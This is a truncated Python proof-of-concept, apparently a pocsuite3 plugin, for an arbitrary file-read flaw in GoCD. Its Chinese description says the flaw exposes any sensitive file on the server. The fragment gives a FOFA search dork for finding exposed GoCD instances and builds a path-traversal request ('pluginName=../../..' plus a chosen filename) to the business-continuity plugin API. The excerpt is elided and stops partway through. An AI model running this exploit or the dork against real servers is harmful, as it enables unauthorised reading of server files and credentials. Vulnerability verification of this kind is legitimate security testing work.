...
class DemoPOC(POCBase):
    ...
    desc = '''GoCD plugin aip 参数中的 pluginName 参数存在任意文件读取漏洞，导致攻击者可以获取服务器中的任意敏感信息'''
    appPowerLink = 'GoCD'
    appName = 'GoCD'
    appVersion = '*'
    fofa_dork = {'fofa': 'title="Create a pipeline - Go"'} 
    samples = []
    install_requires = ['']
    ...
    def _verify(self):
        result = {}
        url = self.url.rstrip('/') + "/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../.." + self.get_option("filename")
        headers = {
